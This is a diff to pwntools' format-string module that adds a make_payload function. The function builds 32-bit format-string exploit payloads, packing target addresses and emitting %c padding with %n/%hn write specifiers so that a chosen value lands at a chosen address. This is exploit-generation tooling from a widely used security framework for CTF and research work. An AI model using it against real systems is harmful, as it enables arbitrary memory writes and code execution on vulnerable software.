@@ -36,6 +36,47 @@ from pwnlib.util.packing import *
 
 log = getLogger(__name__)
 
+def make_payload(offset, where, what, numbwritten=0, nformater=4):
+    """
+    make the payload needed
+    offset is the number of the formatter
+    where is the addr where write what
+    what is what whe want to write at where
+    numbwritten is the number of bytes already written
+    nformater is the number of formatter needed, must be 1, 2 or 4
+    """
+
+    if where > 0xFFFFFFFF or what > 0xFFFFFFFF or context.bits != 32:
+        log.error("can only build 32bits arch payload...")
+
+    if nformater not in [1, 2, 4]:
+        log.error("nformater must be 1, 2 or 4")
+
+    # add where
+    payload = ""
+    for i in range(0, 4, 4/nformater):
+        payload += pack(where+i)
+
+    numbwritten += len(payload)
+    mask = int(4/nformater * "FF", 16)
+    fmtCount = 0
+    for i in range(0, 4, 4/nformater):
+        current = what & mask
+        if numbwritten & mask <= current:
+            to_add = current - (numbwritten & mask)
+        else:
+            to_add = (current | (mask+1)) - (numbwritten & mask)
+
+        if to_add != 0:
+            payload += "%%%dc" % to_add
+        payload += "%%%d$%sn" % (offset + fmtCount, nformater/2 * "h")
+
+        numbwritten += to_add
+        what >>= 4/nformater*8
+        fmtCount += 1
+
+    return payload
+
 class FmtStr(object):
     def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
         self.execute_fmt = execute_fmt
